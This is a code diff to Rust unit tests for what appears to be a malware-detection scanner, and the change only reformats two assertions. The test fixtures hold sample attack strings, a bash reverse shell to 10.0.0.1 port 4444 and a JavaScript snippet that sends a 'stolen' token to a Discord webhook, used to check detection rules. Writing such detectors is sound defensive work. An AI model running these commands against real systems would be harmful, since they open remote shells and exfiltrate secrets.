@@ -136,7 +136,9 @@ mod tests {
         let sample = b"import os\nos.system('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
         let findings = engine.scan_data("exploit.py", sample);
         assert!(!findings.is_empty());
-        assert!(findings.iter().any(|f| f.matched_pattern.contains("ReverseShellGeneric")));
+        assert!(findings
+            .iter()
+            .any(|f| f.matched_pattern.contains("ReverseShellGeneric")));
     }
 
     #[test]
@@ -145,6 +147,8 @@ mod tests {
         let sample = b"const url = 'https://discord.com/api/webhooks/123/xyz'; fetch(url, { body: JSON.stringify({ token: 'stolen' }) });";
         let findings = engine.scan_data("stealer.js", sample);
         assert!(!findings.is_empty());
-        assert!(findings.iter().any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
+        assert!(findings
+            .iter()
+            .any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
     }
 }
